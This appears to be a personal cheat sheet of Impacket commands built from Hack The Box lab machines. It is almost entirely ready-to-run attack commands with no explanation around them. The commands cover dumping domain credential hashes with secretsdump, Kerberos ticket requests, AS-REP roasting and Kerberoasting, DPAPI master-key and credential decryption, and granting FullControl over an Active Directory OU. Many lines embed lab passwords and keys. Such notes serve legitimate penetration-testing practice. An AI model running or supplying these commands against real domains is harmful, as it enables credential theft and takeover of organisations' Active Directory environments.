# Impacket

**SecretsDump**

```zsh
# NTLM
impacket-secretsdump -ntds ntds.dit -system SYSTEM local

impacket-secretsdump "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"

#KERBEROS
impacket-secretsdump -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
```

**GetTGT**

```zsh
impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'
```

**Dpapi**

```zsh
# Master Key
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

# Credential
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

**GetNPUusers**

```zsh
impacket-GetNPUsers -usersfile usernames.txt -no-pass -dc-ip "10.10.11.23" htb.local

impacket-GetUserSPNs -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

**DACLedit**

```zsh
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'auditor' -target-dn 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' 'hercules.htb'/'auditor'@dc.hercules.htb -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb
```
